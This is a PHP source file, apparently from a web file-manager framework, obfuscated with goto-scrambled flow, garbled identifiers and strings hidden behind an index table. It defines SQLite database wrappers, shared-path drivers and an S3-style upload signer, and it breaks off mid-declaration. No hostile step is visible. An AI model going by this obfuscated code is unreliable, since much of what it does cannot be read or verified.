<?php
 goto a‡÷Ìğ; aíõßˆ«ç¬: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto E‚ÂÛ–é; aî ºƒŠ¡: $this->tpl = TEMPLATE . MOD . $EÅ–·Ïˆó†[8]; $this->_classObjectID = mt_rand(0, 10000); goto F¼ÓÉ¯ ; f§Çœ°æˆ: $this->in =& $in; $this->values[$EÅ–·Ïˆó†[6]] =& $config; $this->values[$EÅ–·Ïˆó†[7]] =& $in; goto aî ºƒŠ¡; E‚ÂÛ–é: $EÅ–·Ïˆó† =& $_SERVER[ã®Â„Éæ¹¤]; global $in, $config; $this->config =& $config; goto f§Çœ°æˆ; F¼ÓÉ¯ : } public function loadClass($D×ù³†·éš) { if (1 === func_num_args()) { $this->{$D×ù³†·éš} = new $D×ù³†·éš(); } else { $a Ó“îÙê¹ = new ReflectionClass($D×ù³†·éš); $EëƒÚñíÜ = func_get_args(); array_shift($EëƒÚñíÜ); $this->{$D×ù³†·éš} = $a Ó“îÙê¹->newInstanceArgs($EëƒÚñíÜ); } return $this->{$D×ù³†·éš}; } protected function assign($c¨ê¾­²æ, $cñ°ÅÖíÚ) { $this->values[$c¨ê¾­²æ] = $cñ°ÅÖíÚ; } protected function display($D†ïš£àÄ) { ob_end_clean(); extract($this->values); require $this->tpl . $D†ïš£àÄ; } } class DbSqliteBase extends Db { public function __construct($b›„Öçìó = '') { $BÎÉ‚ó¨ïº =& $_SERVER[ã®Â„Éæ¹¤]; if (!extension_loaded($BÎÉ‚ó¨ïº[9])) { think_exception(think_lang($BÎÉ‚ó¨ïº[10]) . $BÎÉ‚ó¨ïº[11]); } if (!empty($b›„Öçìó)) { if (!isset($b›„Öçìó[$BÎÉ‚ó¨ïº[12]])) { $b›„Öçìó[$BÎÉ‚ó¨ïº[12]] = 438; } $this->config = $b›„Öçìó; if (empty($this->config[$BÎÉ‚ó¨ïº[13]])) { $this->config[$BÎÉ‚ó¨ïº[13]] = array(); } } } public function connect($Bº£É´ğ¸ = '', $eÄµÏïš† = 0) { $bƒˆáßÍ‰¥ =& $_SERVER[ã®Â„Éæ¹¤]; if (!isset($this->linkID[$eÄµÏïš†])) { goto C”Ì‡˜Œ›; FÓÃ¬Ş¾‡‰: $this->linkID[$eÄµÏïš†] = $fº„ÌÔÑŞ($Bº£É´ğ¸[$bƒˆáßÍ‰¥[17]], $Bº£É´ğ¸[$bƒˆáßÍ‰¥[12]]); if (!$this->linkID[$eÄµÏïš†]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto CÄÅÏ”™«Ë; CÄÅÏ”™«Ë: @sqlite_busy_timeout($this->linkID[$eÄµÏïš†], 30000); if (1 != think_config($bƒˆáßÍ‰¥[18])) { unset($this->config); } goto eÉ…ºÕò; C”Ì‡˜Œ›: if (empty($Bº£É´ğ¸)) { $Bº£É´ğ¸ = $this->config; } $a‡áİÜòŞ = !empty($Bº£É´ğ¸[$bƒˆáßÍ‰¥[13]][$bƒˆáßÍ‰¥[14]]) ? $Bº£É´ğ¸[$bƒˆáßÍ‰¥[13]][$bƒˆáßÍ‰¥[14]] : $this->pconnect; $fº„ÌÔÑŞ = $a‡áİÜòŞ ? $bƒˆáßÍ‰¥[15] : $bƒˆáßÍ‰¥[16]; goto FÓÃ¬Ş¾‡‰; eÉ…ºÕò: } return $this->linkID[$eÄµÏïš†]; } public function free() { $this->queryID = null; } public function query($F¥²ˆÇ÷Õç) { goto aø„Ş¥Ó; f†“Ø¯¬´â: $this->queryStr = $F¥²ˆÇ÷Õç; if ($this->queryID) { $this->free(); } think_action_status($C†æ­ì‡Æ[19], 1); goto d‹ İòš; aø„Ş¥Ó: $C†æ­ì‡Æ =& $_SERVER[ã®Â„Éæ¹¤]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto f†“Ø¯¬´â; d‹ İòš: think_status($C†æ­ì‡Æ[20]); $this->queryID = sqlite_query($this->_linkID, $F¥²ˆÇ÷Õç); $this->debug(); goto C¤Êˆªë¦ ; C¤Êˆªë¦ : if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Cè·‹¬õÂ× = $this->getAll(); return $Cè·‹¬õÂ×; } goto BÃˆÍ£¤º; BÃˆÍ£¤º: } public function execute($BÂŸĞ¯¶î“) { goto BÏ»‘³·³; E¨æ«ò¨ù: if (!1 === $FôÔ³İëŠ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto Còİ”ª íŞ; D¨©‘¢Ş´: $this->queryStr = $BÂŸĞ¯¶î“; if ($this->queryID) { $this->free(); } think_action_status($cÚ­£®ùÊÕ[21], 1); goto E‹ƒÉšÀà; E‹ƒÉšÀà: think_status($cÚ­£®ùÊÕ[20]); $FôÔ³İëŠ = sqlite_exec($this->_linkID, $BÂŸĞ¯¶î“); $this->debug(); goto E¨æ«ò¨ù; BÏ»‘³·³: $cÚ­£®ùÊÕ =& $_SERVER[ã®Â„Éæ¹¤]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D¨©‘¢Ş´; Còİ”ª íŞ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ã®Â„Éæ¹¤][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dÇ×é ßÙİ = sqlite_query($this->_linkID, $_SERVER[ã®Â„Éæ¹¤][23]); if (!$dÇ×é ßÙİ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $bĞ¡Ğ§–Ù = sqlite_query($this->_linkID, $_SERVER[ã®Â„Éæ¹¤][24]); if (!$bĞ¡Ğ§–Ù) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $eêœÜÕòŠ… = array(); if ($this->numRows > 0) { for ($f÷İ¾ğ°¿ƒ = 0; $f÷İ¾ğ°¿ƒ < $this->numRows; $f÷İ¾ğ°¿ƒ++) { $eêœÜÕòŠ…[$f÷İ¾ğ°¿ƒ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $eêœÜÕòŠ…; } public function getFields($b»¸¿ğåŒ¯) { $fóôñÏÄÖŒ =& $_SERVER[ã®Â„Éæ¹¤]; $DÙÉàÜÈÜš = $this->query($fóôñÏÄÖŒ[25] . $b»¸¿ğåŒ¯ . $fóôñÏÄÖŒ[26]); $b¾‚äğç = array(); if ($DÙÉàÜÈÜš) { foreach ($DÙÉàÜÈÜš as $eË•Úí´Ù => $E™Êæ†šÉŒ) { $b¾‚äğç[$E™Êæ†šÉŒ[$fóôñÏÄÖŒ[27]]] = array($fóôñÏÄÖŒ[28] => $E™Êæ†šÉŒ[$fóôñÏÄÖŒ[27]], $fóôñÏÄÖŒ[29] => $E™Êæ†šÉŒ[$fóôñÏÄÖŒ[30]], $fóôñÏÄÖŒ[31] => (bool) ($E™Êæ†šÉŒ[$fóôñÏÄÖŒ[32]] === $fóôñÏÄÖŒ[33]), $fóôñÏÄÖŒ[34] => $E™Êæ†šÉŒ[$fóôñÏÄÖŒ[35]], $fóôñÏÄÖŒ[36] => strtolower($E™Êæ†šÉŒ[$fóôñÏÄÖŒ[37]]) == $fóôñÏÄÖŒ[38], $fóôñÏÄÖŒ[39] => strtolower($E™Êæ†šÉŒ[$fóôñÏÄÖŒ[40]]) == $fóôñÏÄÖŒ[41]); } } return $b¾‚äğç; } public function getTables($Aİ½ƒ¤¹Õ¥ = '') { $bÄßÓÙìâ =& $_SERVER[ã®Â„Éæ¹¤]; $b„ºñ¦œ…‘ = $this->query($bÄßÓÙìâ[42] . $bÄßÓÙìâ[43] . $bÄßÓÙìâ[44]); $Då§ğËà = array(); foreach ($b„ºñ¦œ…‘ as $B‹ò¡ËÙ¨« => $a‚©¬İé‘ƒ) { $Då§ğËà[$B‹ò¡ËÙ¨«] = current($a‚©¬İé‘ƒ); } return $Då§ğËà; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Dµ¦¿´ö»Å =& $_SERVER[ã®Â„Éæ¹¤]; $d©‡›õ‹Ş… = sqlite_last_error($this->_linkID); $this->error = $d©‡›õ‹Ş… . $Dµ¦¿´ö»Å[4] . sqlite_error_string($d©‡›õ‹Ş…); if ($Dµ¦¿´ö»Å[33] != $this->queryStr) { $this->error .= LNG($Dµ¦¿´ö»Å[45]) . $this->queryStr; } think_trace($this->error, $Dµ¦¿´ö»Å[33], $Dµ¦¿´ö»Å[46]); return $this->error; } public function escapeString($A•ó—ˆßÏ) { return sqlite_escape_string($A•ó—ˆßÏ); } public function parseLimit($déÕŒô‘) { $BÜÓÓÌî‘Ü =& $_SERVER[ã®Â„Éæ¹¤]; $eƒÓ“Êğà› = $BÜÓÓÌî‘Ü[33]; if (!empty($déÕŒô‘)) { $déÕŒô‘ = explode($BÜÓÓÌî‘Ü[47], $déÕŒô‘); if (count($déÕŒô‘) > 1) { $eƒÓ“Êğà› .= $BÜÓÓÌî‘Ü[48] . $déÕŒô‘[1] . $BÜÓÓÌî‘Ü[49] . $déÕŒô‘[0] . $BÜÓÓÌî‘Ü[50]; } else { $eƒÓ“Êğà› .= $BÜÓÓÌî‘Ü[48] . $déÕŒô‘[0] . $BÜÓÓÌî‘Ü[50]; } } return $eƒÓ“Êğà›; } } class DbSqlite3Base extends Db { public function __construct($B®…ßœÌ‚ê = '') { $a“ ªÕƒÀ’ =& $_SERVER[ã®Â„Éæ¹¤]; if (!class_exists($a“ ªÕƒÀ’[51])) { think_exception(think_lang($a“ ªÕƒÀ’[10]) . $a“ ªÕƒÀ’[52]); } if (!empty($B®…ßœÌ‚ê)) { if (!isset($B®…ßœÌ‚ê[$a“ ªÕƒÀ’[12]])) { $B®…ßœÌ‚ê[$a“ ªÕƒÀ’[12]] = 438; } $this->config = $B®…ßœÌ‚ê; if (empty($this->config[$a“ ªÕƒÀ’[13]])) { $this->config[$a“ ªÕƒÀ’[13]] = array(); } } } public function connect($a½ªÕÕ½¢Æ = '', $FŞÛæÓÆØ§ = 0) { $f¬—ôšˆ’¾ =& $_SERVER[ã®Â„Éæ¹¤]; if (!isset($this->linkID[$FŞÛæÓÆØ§])) { if (empty($a½ªÕÕ½¢Æ)) { $a½ªÕÕ½¢Æ = $this->config; } $this->linkID[$FŞÛæÓÆØ§] = new SQLite3($a½ªÕÕ½¢Æ[$f¬—ôšˆ’¾[17]]); if (!$this->linkID[$FŞÛæÓÆØ§]) { think_exception($this->linkID[$FŞÛæÓÆØ§]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$FŞÛæÓÆØ§]->busyTimeout(30000); if (1 != think_config($f¬—ôšˆ’¾[18])) { unset($this->config); } } return $this->linkID[$FŞÛæÓÆØ§]; } public function free() { $this->queryID = null; } public function query($AçŠà‹äÄ˜) { goto A¸—…´Ìˆ¹; câ³Ğ›‹‘’: if (!1 === $this->queryID) { $this->error(); return !1; } else { $aÄÜé»¼Á› = $this->getAll(); $this->numRows = count($aÄÜé»¼Á›); return $aÄÜé»¼Á›; } goto dÕ¡Ğî¨©; A¸—…´Ìˆ¹: $Eçò¦âÍÌŒ =& $_SERVER[ã®Â„Éæ¹¤]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c²é¦Ö—‘½; c²é¦Ö—‘½: $this->queryStr = $AçŠà‹äÄ˜; if ($this->queryID) { $this->free(); } think_action_status($Eçò¦âÍÌŒ[19], 1); goto F¸Œ¶‹œÔ¡; F¸Œ¶‹œÔ¡: think_status($Eçò¦âÍÌŒ[20]); $this->queryID = $this->_linkID->query($AçŠà‹äÄ˜); $this->debug(); goto câ³Ğ›‹‘’; dÕ¡Ğî¨©: } public function execute($Dá–Ç”ˆÚï) { goto D™øå–Œéõ; D™øå–Œéõ: $Aà‰…‰Ú =& $_SERVER[ã®Â„Éæ¹¤]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bƒğ†ÇÆê; b¯—ø¡×é: if (!1 === $E©î„Ÿ«ˆ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto eêâÑÂ‹ä; bƒğ†ÇÆê: $this->queryStr = $Dá–Ç”ˆÚï; if ($this->queryID) { $this->free(); } think_action_status($Aà‰…‰Ú[21], 1); goto dĞ¦¶©ÏÁ; dĞ¦¶©ÏÁ: think_status($Aà‰…‰Ú[20]); $E©î„Ÿ«ˆ = $this->_linkID->exec($Dá–Ç”ˆÚï); $this->debug(); goto b¯—ø¡×é; eêâÑÂ‹ä: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ã®Â„Éæ¹¤][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C÷‹ã„ë¾¿ = $this->_linkID->query($_SERVER[ã®Â„Éæ¹¤][23]); if (!$C÷‹ã„ë¾¿) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $dñĞôàÉÁÜ = $this->_linkID->query($_SERVER[ã®Â„Éæ¹¤][24]); if (!$dñĞôàÉÁÜ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $f„öç‘ñğ™ = array(); while ($c²­è„ÓÔ± = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $f„öç‘ñğ™[] = $c²­è„ÓÔ±; } $this->queryID->reset(); return $f„öç‘ñğ™; } public function getFields($EíîËï´æ) { $d½Ï•ÇË¸› =& $_SERVER[ã®Â„Éæ¹¤]; $aöÆÑÉ³³ö = $this->query($d½Ï•ÇË¸›[25] . $EíîËï´æ . $d½Ï•ÇË¸›[26]); $E×”Ç¡½ = array(); if ($aöÆÑÉ³³ö) { foreach ($aöÆÑÉ³³ö as $C˜¤ÅËóŒÆ => $AÕÈ©µº‡í) { $E×”Ç¡½[$AÕÈ©µº‡í[$d½Ï•ÇË¸›[28]]] = array($d½Ï•ÇË¸›[28] => $AÕÈ©µº‡í[$d½Ï•ÇË¸›[28]], $d½Ï•ÇË¸›[29] => $AÕÈ©µº‡í[$d½Ï•ÇË¸›[29]], $d½Ï•ÇË¸›[31] => (bool) ($AÕÈ©µº‡í[$d½Ï•ÇË¸›[31]] === $d½Ï•ÇË¸›[33]), $d½Ï•ÇË¸›[34] => $AÕÈ©µº‡í[$d½Ï•ÇË¸›[53]], $d½Ï•ÇË¸›[36] => (bool) $AÕÈ©µº‡í[$d½Ï•ÇË¸›[54]], $d½Ï•ÇË¸›[39] => (bool) $AÕÈ©µº‡í[$d½Ï•ÇË¸›[54]]); } } return $E×”Ç¡½; } public function getTables($d—‡Ãîæî = '') { $F”ŠƒØ…Õ =& $_SERVER[ã®Â„Éæ¹¤]; $b×÷Æê» = $this->query($F”ŠƒØ…Õ[42] . $F”ŠƒØ…Õ[43] . $F”ŠƒØ…Õ[44]); $D‘ó¢…ŞÉ° = array(); foreach ($b×÷Æê» as $AÄ½°ŒÆ´ => $AµïÊöå´‡) { $D‘ó¢…ŞÉ°[$AÄ½°ŒÆ´] = current($AµïÊöå´‡); } return $D‘ó¢…ŞÉ°; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $E›ãÜè‡œƒ =& $_SERVER[ã®Â„Éæ¹¤]; $this->error = $this->_linkID->lastErrorMsg(); if ($E›ãÜè‡œƒ[33] != $this->queryStr) { $this->error .= LNG($E›ãÜè‡œƒ[45]) . $this->queryStr; } think_trace($this->error, $E›ãÜè‡œƒ[33], $E›ãÜè‡œƒ[46]); return $this->error; } public function escapeString($d‰…ÌÓ’×™) { $DßòÃ–å¼Š =& $_SERVER[ã®Â„Éæ¹¤]; if ($this->_linkID) { return $this->_linkID->escapeString($d‰…ÌÓ’×™); } return str_ireplace($DßòÃ–å¼Š[55], $DßòÃ–å¼Š[56], $d‰…ÌÓ’×™); } public function parseLimit($e¿ŒÁ¸¹î) { $EòŸ¨ùÑ¡ƒ =& $_SERVER[ã®Â„Éæ¹¤]; $CÏ¢ÓëÛÑ = $EòŸ¨ùÑ¡ƒ[33]; if (!empty($e¿ŒÁ¸¹î)) { $e¿ŒÁ¸¹î = explode($EòŸ¨ùÑ¡ƒ[47], $e¿ŒÁ¸¹î); if (count($e¿ŒÁ¸¹î) > 1) { $CÏ¢ÓëÛÑ .= $EòŸ¨ùÑ¡ƒ[48] . $e¿ŒÁ¸¹î[1] . $EòŸ¨ùÑ¡ƒ[49] . $e¿ŒÁ¸¹î[0] . $EòŸ¨ùÑ¡ƒ[50]; } else { $CÏ¢ÓëÛÑ .= $EòŸ¨ùÑ¡ƒ[48] . $e¿ŒÁ¸¹î[0] . $EòŸ¨ùÑ¡ƒ[50]; } } return $CÏ¢ÓëÛÑ; } } goto d¡öÈÙĞğ; bô•²…°‡: class PathDriverDriverShareItem { public function __construct($dÓ¨Èà’Äµ) { $this->pathParse = $dÓ¨Èà’Äµ; } public function __call($dƒª¸ÎºÖ, $E‹ííŸ¸œ) { $aÕÊ©ÃùçË =& $_SERVER[ã®Â„Éæ¹¤]; if (method_exists($this, $dƒª¸ÎºÖ)) { return; } $AÔšÖâ»Œ¼ = call_user_func_array(array($aÕÊ©ÃùçË[1144], $dƒª¸ÎºÖ), $E‹ííŸ¸œ); $aî°¸¥ä¦† = array($aÕÊ©ÃùçË[1145], $aÕÊ©ÃùçË[1146], $aÕÊ©ÃùçË[1147], $aÕÊ©ÃùçË[1148], $aÕÊ©ÃùçË[492], $aÕÊ©ÃùçË[494], $aÕÊ©ÃùçË[1149], $aÕÊ©ÃùçË[103], $aÕÊ©ÃùçË[1150], $aÕÊ©ÃùçË[1151]); if (in_array($dƒª¸ÎºÖ, $aî°¸¥ä¦†)) { $AÔšÖâ»Œ¼ = $this->getPathOuter($AÔšÖâ»Œ¼); } return $AÔšÖâ»Œ¼; } public function copy($F–£ìÖ‚Ë², $EŒâ ß“ÁÃ, $cÊ«©ñµÇ… = false) { return $this->copyMove($F–£ìÖ‚Ë², $EŒâ ß“ÁÃ, $cÊ«©ñµÇ…, $_SERVER[ã®Â„Éæ¹¤][492]); } public function move($FŸÃ‘Î¦, $F‰ó‰º¹Å¿, $B•à”íò‰Õ = false) { return $this->copyMove($FŸÃ‘Î¦, $F‰ó‰º¹Å¿, $B•à”íò‰Õ, $_SERVER[ã®Â„Éæ¹¤][494]); } private function copyMove($EÅåì„, $CÊ›¬ğğÚ˜, $BëŠéï„Ô±, $eœÃÉâªä÷) { goto d‚Ïö†ê˜; d‚Ïö†ê˜: $FÌ¡òŠ…Î‚ =& $_SERVER[ã®Â„Éæ¹¤]; $BÛã¾ªÌÔ– = $CÊ›¬ğğÚ˜; $F»…ÂÜ‚ù = IO::driverMake($CÊ›¬ğğÚ˜); goto BÊ¹ç•¿³‹; f‹àø©Üàƒ: return $eÏßÎã÷‡Í; goto dçÆİÌŠ³µ; BÊ¹ç•¿³‹: if ($F»…ÂÜ‚ù->pathParse[$FÌ¡òŠ…Î‚[1017]]) { $CÊ›¬ğğÚ˜ = $F»…ÂÜ‚ù->pathParse[$FÌ¡òŠ…Î‚[1017]]; } else { $CÊ›¬ğğÚ˜ = $BÛã¾ªÌÔ–; } $eÏßÎã÷‡Í = IO::copyMove($EÅåì„, $CÊ›¬ğğÚ˜, $BëŠéï„Ô±, $eœÃÉâªä÷); $eÏßÎã÷‡Í = $this->getPathOuter($eÏßÎã÷‡Í); goto f‹àø©Üàƒ; dçÆİÌŠ³µ: } public function pathFather($E·ô…òØ«Ñ) { return get_path_father($this->pathParse[$_SERVER[ã®Â„Éæ¹¤][75]]); } public function iconvSystem($aë†´î¦Î•) { return $aë†´î¦Î•; } protected function infoParse($dì³´Úæ„½, $BŸÎ”Æ‡«ô = false) { $a‘ß†˜Âš¯ =& $_SERVER[ã®Â„Éæ¹¤]; $C‹‘Ÿìé×ì = $this->pathParse[$a‘ß†˜Âš¯[439]][$a‘ß†˜Âš¯[1038]] . $this->pathParse[$a‘ß†˜Âš¯[1031]]; if ($BŸÎ”Æ‡«ô) { $E œ÷¸Í· = IO::infoWithChildren($C‹‘Ÿìé×ì); } else { $E œ÷¸Í· = IO::info($C‹‘Ÿìé×ì); } $e“”´™°‰í = $this->pathParse[$a‘ß†˜Âš¯[439]]; return Action($a‘ß†˜Âš¯[1143])->_shareItemeParse($E œ÷¸Í·, $e“”´™°‰í); } public function listAll($d´‰§ë¦¥) { $Eì×˜ë–À“ =& $_SERVER[ã®Â„Éæ¹¤]; $B¯ÊÓ•ˆØÓ = IO::listAll($d´‰§ë¦¥); $eÏ“ì“ÚëË = $this->pathParse[$Eì×˜ë–À“[439]]; foreach ($B¯ÊÓ•ˆØÓ as &$Aæ¶ÕÅ‘) { check_abort(); $Aæ¶ÕÅ‘ = array_merge(IO::info($Aæ¶ÕÅ‘[$Eì×˜ë–À“[75]]), $Aæ¶ÕÅ‘); $Aæ¶ÕÅ‘[$Eì×˜ë–À“[391]] = Action($Eì×˜ë–À“[1143])->_shareItemeParse($Aæ¶ÕÅ‘, $eÏ“ì“ÚëË); } unset($Aæ¶ÕÅ‘); return $B¯ÊÓ•ˆØÓ; } public function getPathOuter($dìÃìğ‰®ò) { goto FÔéó›àİŠ; Då“˜ŒÎ‚¨: $AÍğ¼š¯Ü… = KodIO::clear($dìÃìğ‰®ò); $b§óíòõ‰· = KodIO::clear($this->pathParse[$eŒ»ÁÙİŒ[439]][$eŒ»ÁÙİŒ[1038]]); $aá—ê­ŞÓ” = substr($AÍğ¼š¯Ü…, strlen($b§óíòõ‰·)); goto C—‰¥ÈëÙ¢; FÔéó›àİŠ: $eŒ»ÁÙİŒ =& $_SERVER[ã®Â„Éæ¹¤]; $fî¼•ÊÂ° = KodIO::parse($dìÃìğ‰®ò); if ($fî¼•ÊÂ°[$eŒ»ÁÙİŒ[29]] == KodIO::KOD_SHARE_ITEM) { return $fî¼•ÊÂ°[$eŒ»ÁÙİŒ[75]]; } goto Då“˜ŒÎ‚¨; C—‰¥ÈëÙ¢: if (substr($AÍğ¼š¯Ü…, 0, strlen($b§óíòõ‰·)) != $b§óíòõ‰·) { return !1; } return $this->pathParse[$eŒ»ÁÙİŒ[1032]] . $eŒ»ÁÙİŒ[8] . ltrim($aá—ê­ŞÓ”, $eŒ»ÁÙİŒ[8]); goto fš‰òÀ«¿; fš‰òÀ«¿: } public function getType() { $Cˆã£¦×Æ =& $_SERVER[ã®Â„Éæ¹¤]; $bÀ‡øÛ‚Œ• = str_replace($Cˆã£¦×Æ[71], $Cˆã£¦×Æ[33], get_class($this)); return strtolower($bÀ‡øÛ‚Œ•); } public function isTypeObject($b™âŠ˜½è) { return IO::isTypeObject($b™âŠ˜½è); } public function info($e›À‡‹×‰ğ) { return $this->infoParse($e›À‡‹×‰ğ); } public function infoAuth($aõÛ•ÄÅ×Ù) { return $this->infoParse($aõÛ•ÄÅ×Ù); } public function infoWithChildren($Eêâ—³îÒ) { return $this->infoParse($Eêâ—³îÒ, !0); } public function infoFull($cĞÁ‚™ø¼ñ) { return $this->infoParse($cĞÁ‚™ø¼ñ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($EÈÉ“Ş¢Ê„) { $this->pathParse = $EÈÉ“Ş¢Ê„; } protected function infoParse($eÉŒÖ”ˆ‚®, $EË½–Ó—± = false) { $a´âã†å²‘ =& $_SERVER[ã®Â„Éæ¹¤]; return Action($a´âã†å²‘[1037])->sharePathInfo($this->pathParse[$a´âã†å²‘[75]], !0, $EË½–Ó—±); } public function listPath($CšÙÊµâ½, $D‘ÙâÒ…ä¯ = false) { $b¢í‡Ÿ×‹ =& $_SERVER[ã®Â„Éæ¹¤]; $D”„Ë ÃÅ– = IO::listPath($CšÙÊµâ½, $D‘ÙâÒ…ä¯); foreach ($D”„Ë ÃÅ– as $C¼èÏ±Å => $dÌ¸àÅùÎÇ) { if (!in_array($C¼èÏ±Å, array($b¢í‡Ÿ×‹[73], $b¢í‡Ÿ×‹[74]))) { continue; } foreach ($dÌ¸àÅùÎÇ as $Dà¨è´Òâ => $bİèİ’½ˆ) { $bİèİ’½ˆ = Action($b¢í‡Ÿ×‹[1152])->parsePathChildren($bİèİ’½ˆ, array($b¢í‡Ÿ×‹[387] => $CšÙÊµâ½)); $D”„Ë ÃÅ–[$C¼èÏ±Å][$Dà¨è´Òâ] = Action($b¢í‡Ÿ×‹[1037])->shareItemInfo($bİèİ’½ˆ); } } return $D”„Ë ÃÅ–; } public function listAll($C›çô¦ˆ¯º) { $c±Ä•¯Üœê =& $_SERVER[ã®Â„Éæ¹¤]; $dËâºäôªÄ = IO::listAll($C›çô¦ˆ¯º); foreach ($dËâºäôªÄ as &$e‹±¡Ê­àŞ) { $e‹±¡Ê­àŞ = array_merge(IO::info($e‹±¡Ê­àŞ[$c±Ä•¯Üœê[75]]), $e‹±¡Ê­àŞ); $e‹±¡Ê­àŞ[$c±Ä•¯Üœê[391]] = Action($c±Ä•¯Üœê[1037])->shareItemInfo($e‹±¡Ê­àŞ); } unset($e‹±¡Ê­àŞ); return $dËâºäôªÄ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($FÔ—Š¥±Üó) { parent::__construct($FÔ—Š¥±Üó); $this->signatureVersion($_SERVER[ã®Â„Éæ¹¤][200]); } public function uploadFormData($A¨¥îƒµÈ, $eæÆÔìî¸İ = 3600) { goto Aä…™ËØô; c«É›ä¿à: $cØßÆ³Ô‹é = base64_encode(json_encode($FÁ¹º“òÌ)); $c±–‹Í©Õ» = hash_hmac($D”¬‚øšæ[1163], $Dî²‹œ—áí, $D”¬‚øšæ[1164] . $this->secret, !0); $fÈÁ¶˜¬ËÀ = hash_hmac($D”¬‚øšæ[1163], $this->region, $c±–‹Í©Õ», !0); goto døØêïÊÛÊ; Dù½† Ó‚†: $F¦±ëö¹• = $D”¬‚øšæ[59]; $AÈíùæßíÄ = gmdate($D”¬‚øšæ[1154]); $Dî²‹œ—áí = gmdate($D”¬‚øšæ[712]); goto Bø¶îÛçõ; Bø¶îÛçõ: $BÊÇ ¢ÑÂ• = $D”¬‚øšæ[1155]; $a¡šƒ“ è« = $eæÆÔìî¸İ . $D”¬‚øšæ[33]; $fò ßœß–ª = $D”¬‚øšæ[1119]; goto c±„íˆ±ß; døØêïÊÛÊ: $Côï„âØƒ = hash_hmac($D”¬‚øšæ[1163], $F¦±ëö¹•, $fÈÁ¶˜¬ËÀ, !0); $A…ÒáÔ®ï„ = hash_hmac($D”¬‚øšæ[1163], $BÊÇ ¢ÑÂ•, $Côï„âØƒ, !0); $cÂ—æ…¨Çè = hash_hmac($D”¬‚øšæ[1163], $cØßÆ³Ô‹é, $A…ÒáÔ®ï„); goto fçÄŸ†Èº; Aä…™ËØô: $D”¬‚øšæ =& $_SERVER[ã®Â„Éæ¹¤]; $C÷øŠ¾ëŠº = $D”¬‚øšæ[185]; $e ö“£š¥ê = $D”¬‚øšæ[1153]; goto Dù½† Ó‚†; fçÄŸ†Èº: $c£œ»¡‘…© = array($D”¬‚øšæ[199] => $D”¬‚øšæ[33], $D”¬‚øšæ[1165] => $D”¬‚øšæ[33], $D”¬‚øšæ[1123] => $C÷øŠ¾ëŠº, $D”¬‚øšæ[1127] => $fò ßœß–ª, $D”¬‚øšæ[1131] => $cØßÆ³Ô‹é, $D”¬‚øšæ[1166] => $e¾˜©Šêˆ, $D”¬‚øšæ[1167] => $e ö“£š¥ê, $D”¬‚øšæ[1168] => $AÈíùæßíÄ, $D”¬‚øšæ[1169] => $a¡šƒ“ è«, $D”¬‚øšæ[1170] => $cÂ—æ…¨Çè, $D”¬‚øšæ[169] => $this->getHost()); return $c£œ»¡‘…©; goto d ìÁÛ•‹; c±„íˆ±ß: $B«Äç´à–Ë = array($this->accessKey, $Dî²‹œ—áí, $this->region, $F¦±ëö¹•, $BÊÇ ¢ÑÂ•); $e¾˜©Šêˆ = implode($D”¬‚øšæ[8], $B«Äç´à–Ë); $FÁ¹º“òÌ = array($D”¬‚øšæ[1121] => gmdate($D”¬‚øšæ[1120], strtotime($D”¬‚øšæ[1156])), $D”¬‚øšæ[1122] => array(array($D”¬‚øšæ[1124] => $this->bucket), array($D”¬‚øšæ[1123] => $C÷øŠ¾ëŠº), array($D”¬‚øšæ[1125], $D”¬‚øšæ[1126], $D”¬‚øšæ[33]), array($D”¬‚øšæ[1125], $D”¬‚øšæ[1157], $D”¬‚øšæ[33]), array($D”¬‚øšæ[1125], $D”¬‚øšæ[1158], $D”¬‚øšæ[33]), array($D”¬‚øšæ[1127] => $fò ßœß–ª), array($D”¬‚øšæ[1159] => $e¾˜©Šêˆ), array($D”¬‚øšæ[1160] => $e ö“£š¥ê), array($D”¬‚øšæ[1161] => $AÈíùæßíÄ), array($D”¬‚øšæ[1162] => $a¡šƒ“ è«))); goto c«É›ä¿à; d ìÁÛ•‹: } } goto B›©ÆÎ÷ù; Bé›¸µÆêÀ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\x4c\151\x67\x68\164\x41\160\160"; public $modelType = "\123\x79\163\x74\145\155\117\x70\x74\151\x6f\156"; public $field = array("\x6e\141\155\145", "\x67\x72\x6f\165\x70", "\144\x65\x73\x63", "\x63\x6f\x6e\164\145\156\x74"); public function listData($E— Ñ•…ƒ— = false, $BÚ›™ã¤“ = "\155\157\144\151\x66\x79\124\x69\x6d\x65", $fë„Š’±Ï— = true) { return parent::listData($E— Ñ•…ƒ—, $BÚ›™ã¤“, $fë„Š’±Ï—); } public function 